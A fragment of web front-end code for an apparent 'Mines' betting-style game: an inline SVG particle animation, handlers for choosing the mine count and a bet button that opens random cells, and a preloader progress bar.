                            <stop id="particles-u-62-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-52-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-52-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-52-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-52-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-52-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-42-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-42-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-42-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-42-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-42-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-35-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-35-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-35-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-35-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-35-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-25-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-25-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-25-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-25-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-25-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-36-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-36-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-36-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-36-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-36-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-37-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-37-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-37-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-37-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-37-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-26-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-26-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-26-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-26-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-26-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-38-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-38-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-38-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-38-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-38-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-27-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-27-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-27-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-27-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-27-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-28-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-28-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-28-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-28-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-28-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-14-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-14-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-14-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-14-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-14-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-15-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-15-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-15-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-15-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-15-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-02-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-02-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-02-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-02-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-02-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                          <radialgradient id="particles-u-16-fill" cx="0" cy="0" r=".5" gradientTransform="translate(.5 .5)" gradientUnits="objectBoundingBox" spreadMethod="pad">
                            <stop id="particles-u-16-fill-0" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-16-fill-1" offset="0%" stop-color="var(--mines-particles-main)"></stop>
                            <stop id="particles-u-16-fill-2" offset="0%" stop-color="rgba(255,184,0,0.51)"></stop>
                            <stop id="particles-u-16-fill-3" offset="85%" stop-color="rgba(255,184,0,0)"></stop>
                          </radialgradient>
                        </defs>
                        <g id="particles-u-particles">
                          <g id="particles-s-g1" transform="matrix(1.30545 0 0 1.30546 -4.93 -4.88)">
                            <g id="particles-u-6_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-6" r=".5" fill="url(#particles-u-6-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-5_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-5" r=".5" fill="url(#particles-u-5-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-4_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-4" r=".5" fill="url(#particles-u-4-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-3_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-3" r=".5" fill="url(#particles-u-3-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-2_to" transform="translate(14.952 16.476)">
                              <circle id="particles-u-2" r=".5" fill="url(#particles-u-2-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-32_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-32" r=".5" fill="url(#particles-u-32-fill)" stroke-width="0" transform="scale(.8564)"></circle>
                            </g>
                            <g id="particles-u-33_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-33" r=".5" fill="url(#particles-u-33-fill)" stroke-width="0" transform="scale(.8564)"></circle>
                            </g>
                            <g id="particles-u-22_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-22" r=".5" fill="url(#particles-u-22-fill)" stroke-width="0" transform="scale(.8564)"></circle>
                            </g>
                            <g id="particles-u-34_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-34" r=".5" fill="url(#particles-u-34-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-23_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-23" r=".5" fill="url(#particles-u-23-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-24_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-24" r=".5" fill="url(#particles-u-24-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-1_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-1" r=".5" fill="url(#particles-u-1-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-12_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-12" r=".5" fill="url(#particles-u-12-fill)" stroke-width="0" transform="rotate(.073) scale(2.4696)"></circle>
                            </g>
                            <g id="particles-u-0_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-0" r=".5" fill="url(#particles-u-0-fill)" stroke-width="0" transform="rotate(.073) scale(2.4696)"></circle>
                            </g>
                            <g id="particles-u-13_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-13" r=".5" fill="url(#particles-u-13-fill)" stroke-width="0" transform="rotate(.073) scale(2.4696)"></circle>
                            </g>
                            <g id="particles-s-ellipse1_to" transform="translate(15.38 17.957)">
                              <circle id="particles-s-ellipse1" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-copy-of-ellipse" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse2_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-copy-of-ellipse2" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse3_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse3" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-2_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse-2" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-22_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse-22" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-3_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse-3" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-23_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-copy-of-ellipse-23" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="scale(.34678)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-32_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-copy-of-ellipse-32" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="scale(.34678)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-33_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-copy-of-ellipse-33" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="scale(.34678)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-24_to" transform="translate(14.952 16.476)">
                              <circle id="particles-u-copy-of-ellipse-24" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-34_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-34" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-4_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-4" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-5_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-5" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-6_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-6" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                          </g>
                          <g id="particles-u-copy-of-group" transform="matrix(.12007 -1.29991 1.29992 .12007 -6.566 35.037)">
                            <g id="particles-u-62_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-62" r=".5" fill="url(#particles-u-62-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-52_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-52" r=".5" fill="url(#particles-u-52-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-42_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-42" r=".5" fill="url(#particles-u-42-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-35_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-35" r=".5" fill="url(#particles-u-35-fill)" stroke-width="0" transform="scale(1.88243)"></circle>
                            </g>
                            <g id="particles-u-25_to" transform="translate(14.952 16.476)">
                              <circle id="particles-u-25" r=".5" fill="url(#particles-u-25-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-36_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-36" r=".5" fill="url(#particles-u-36-fill)" stroke-width="0" transform="scale(.8564)"></circle>
                            </g>
                            <g id="particles-u-37_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-37" r=".5" fill="url(#particles-u-37-fill)" stroke-width="0" transform="scale(.8564)"></circle>
                            </g>
                            <g id="particles-u-26_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-26" r=".5" fill="url(#particles-u-26-fill)" stroke-width="0" transform="scale(.8564)"></circle>
                            </g>
                            <g id="particles-u-38_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-38" r=".5" fill="url(#particles-u-38-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-27_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-27" r=".5" fill="url(#particles-u-27-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-28_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-28" r=".5" fill="url(#particles-u-28-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-14_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-14" r=".5" fill="url(#particles-u-14-fill)" stroke-width="0" transform="scale(1.38453 1.38452)"></circle>
                            </g>
                            <g id="particles-u-15_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-15" r=".5" fill="url(#particles-u-15-fill)" stroke-width="0" transform="rotate(.073) scale(2.4696)"></circle>
                            </g>
                            <g id="particles-u-02_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-02" r=".5" fill="url(#particles-u-02-fill)" stroke-width="0" transform="rotate(.073) scale(2.4696)"></circle>
                            </g>
                            <g id="particles-u-16_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-16" r=".5" fill="url(#particles-u-16-fill)" stroke-width="0" transform="rotate(.073) scale(2.4696)"></circle>
                            </g>
                            <g id="particles-s-ellipse2_to" transform="translate(15.38 17.957)">
                              <circle id="particles-s-ellipse2" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse4_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-copy-of-ellipse4" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse5_to" transform="translate(15.38 17.957)">
                              <circle id="particles-u-copy-of-ellipse5" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse6_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse6" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-25_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse-25" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-26_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse-26" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-35_to" transform="translate(16.097 17.906)">
                              <circle id="particles-u-copy-of-ellipse-35" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-27_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-copy-of-ellipse-27" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="scale(.34678)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-36_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-copy-of-ellipse-36" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="scale(.34678)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-37_to" transform="translate(17.037 17.306)">
                              <circle id="particles-u-copy-of-ellipse-37" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="scale(.34678)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-28_to" transform="translate(14.952 16.476)">
                              <circle id="particles-u-copy-of-ellipse-28" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.153) scale(.56063)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-38_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-38" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-42_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-42" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-52_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-52" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                            <g id="particles-u-copy-of-ellipse-62_to" transform="translate(13.76 18.848)">
                              <circle id="particles-u-copy-of-ellipse-62" r=".5" fill="var(--mines-particles-secondary)" stroke-width="0" transform="rotate(.131) scale(.76224)"></circle>
                            </g>
                          </g>
                        </g>
                      </svg>
                    </div>
                  </div>
                </button>`;
        });
    }

    // Обработчик события для переключения количества мин
    mineCountButtons.forEach(button => {
        button.addEventListener('click', function() {
            mineCountButtons.forEach(btn => btn.classList.remove('selected-qtwIkFReUD'));
            this.classList.add('selected-qtwIkFReUD');
            selectedMineCount = parseInt(this.textContent, 10);
        });
    });

    // Обработчик события для кнопки bet
    betButton.addEventListener('click', function() {
        resetGame();
        let cellsToOpen;

        switch (selectedMineCount) {
            case 2:
                cellsToOpen = 7;
                break;
            case 3:
                cellsToOpen = 5;
                break;
            case 5:
            case 7:
                cellsToOpen = 3;
                break;
            default:
                cellsToOpen = 5;
        }

        openRandomCells(cellsToOpen);
    });
});





    var progress = 0
    const intervalId = setInterval(updateProgress, 30)
    var elem = document.getElementById('bar')
    var percentElem = document.getElementById('percent')
    var loader = document.getElementById('loader')
    var root = document.getElementById('root')

    function removePreloader() {
      clearInterval(intervalId)
      loader.style.display = 'none'
      root.removeAttribute('hidden')
    }

    function setPreloaderPercent(percent) {
      percentElem.innerHTML = percent + '%'
      if (percent > 100) percent = 100
      elem.style.width = 100 - percent + '%'
    }

    function updateProgress() {
      if (progress >= 99) {
        clearInterval(intervalId)
        return
      }
      const delta = (100 - progress) / 100
      progress += delta
      setPreloaderPercent(Math.round(progress))
    }